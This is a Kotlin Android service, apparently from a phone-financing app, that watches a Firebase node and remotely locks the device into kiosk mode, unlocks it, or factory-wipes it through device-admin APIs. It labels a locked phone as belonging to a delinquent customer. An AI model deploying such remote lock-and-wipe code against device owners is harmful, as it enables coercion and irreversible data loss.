package com.example.myapplication

import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase

class CommandService : Service() {

    private lateinit var db: DatabaseReference
    private lateinit var dpm: DevicePolicyManager
    private lateinit var admin: ComponentName

    override fun onCreate() {
        super.onCreate()

        db = Firebase.database.reference
        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        admin = ComponentName(this, MyDeviceAdminReceiver::class.java)

        listenForCommands()

        Log.i("CommandService", "✅ Serviço iniciado e escutando comandos do Firebase.")
    }

    /**
     * Escuta continuamente os comandos no Firebase:
     * - lock → bloqueia o dispositivo e entra em modo quiosque
     * - unlock → sai do modo quiosque
     * - wipe → limpa todos os dados
     */
    private fun listenForCommands() {
        db.child("device/command").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                when (snapshot.value?.toString()?.lowercase()) {
                    "lock" -> {
                        Log.i("CommandService", "🔒 Comando LOCK recebido")
                        handleLockCommand()
                    }

                    "unlock" -> {
                        Log.i("CommandService", "✅ Comando UNLOCK recebido")
                        handleUnlockCommand()
                    }

                    "wipe" -> {
                        Log.w("CommandService", "🧹 Comando WIPE recebido")
                        handleWipeCommand()
                    }

                    else -> Log.d("CommandService", "ℹ️ Comando desconhecido: ${snapshot.value}")
                }
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e("CommandService", "❌ Erro ao escutar Firebase: ${error.message}")
                db.child("device/feedback").setValue("❌ Erro: ${error.message}")
            }
        })
    }

    private fun handleLockCommand() {
        try {
            // Bloqueia imediatamente a tela
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow()
                Log.i("CommandService", "🔐 Tela bloqueada com sucesso")
            }

            // Define o app como permitido para modo quiosque
            if (dpm.isDeviceOwnerApp(packageName)) {
                dpm.setLockTaskPackages(admin, arrayOf(packageName))
            }

            // Abre a MainActivity em modo quiosque
            val intent = Intent(this, MainActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)

            db.child("device/feedback").setValue("🚫 Cliente inadimplente — dispositivo bloqueado")

        } catch (e: Exception) {
            Log.e("CommandService", "Erro ao processar comando LOCK: ${e.message}")
            db.child("device/feedback").setValue("❌ Erro no bloqueio: ${e.message}")
        }
    }

    private fun handleUnlockCommand() {
        try {
            // Envia feedback
            db.child("device/feedback").setValue("✅ Cliente adimplente — acesso liberado")

            // Reinicia a MainActivity para sair do modo quiosque
            val intent = Intent(this, MainActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            startActivity(intent)

            Log.i("CommandService", "🔓 Saindo do modo quiosque com sucesso.")

        } catch (e: Exception) {
            Log.e("CommandService", "Erro ao processar comando UNLOCK: ${e.message}")
        }
    }

    private fun handleWipeCommand() {
        try {
            if (dpm.isAdminActive(admin)) {
                dpm.wipeData(0)
                db.child("device/feedback").setValue("🧹 Dispositivo resetado remotamente")
            } else {
                db.child("device/feedback").setValue("⚠️ Admin não ativo — wipe ignorado")
            }
        } catch (e: Exception) {
            Log.e("CommandService", "Erro ao executar WIPE: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("CommandService", "♻️ Serviço reiniciado automaticamente (START_STICKY)")
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.w("CommandService", "🛑 Serviço encerrado — será reiniciado automaticamente.")
    }
}
